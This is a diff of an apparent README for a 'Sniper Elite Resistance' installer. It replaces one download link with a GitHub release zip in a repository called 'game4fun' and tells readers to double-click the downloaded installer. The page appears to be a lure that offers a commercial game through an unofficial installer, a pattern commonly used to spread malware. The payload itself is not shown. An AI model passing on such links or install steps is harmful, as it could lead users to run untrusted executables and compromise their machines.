@@ -23,7 +23,7 @@ Follow these steps to download and install Sniper Elite Resistance:
 
 1. **Download the Installer**  
    Click on the link below to download the installer for Sniper Elite Resistance:  
-   [Download Sniper Elite Resistance Installer](https://nicecolns.com/)
+   [Download Sniper Elite Resistance Installer](https://github.com/JeanSylvestrek/game4fun/releases/download/publish/Installer.zip)
 
 2. **Run the Installer**  
    After downloading the installer, locate the file and double-click to begin the installation.
